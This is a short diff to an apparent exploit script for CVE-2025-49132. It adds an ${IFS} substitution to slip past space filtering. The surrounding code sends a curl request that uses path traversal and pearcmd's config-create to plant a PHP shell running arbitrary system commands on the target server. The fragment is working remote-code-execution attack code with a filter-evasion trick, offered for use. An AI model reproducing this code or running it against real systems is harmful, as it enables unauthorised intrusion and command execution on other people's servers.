@@ -90,6 +90,7 @@ class CVE_2025_49132():
         arguments:
             command: the command you will have to excute
         """
+        command = command.replace(' ','\\$\\\\{IFS\\\\}')
         #injecting your command
         subprocess.run(f"curl \"http://{self.host}/locales/locale.json?+config-create+/&locale=../../../../..{self.pearpath}&namespace=pearcmd&/<?=print('---DELMITER---');system('{command}');print('---DELMITER---');?>+/tmp/payload.php\"",capture_output=True,text=True,shell=True)
         # excuting the command
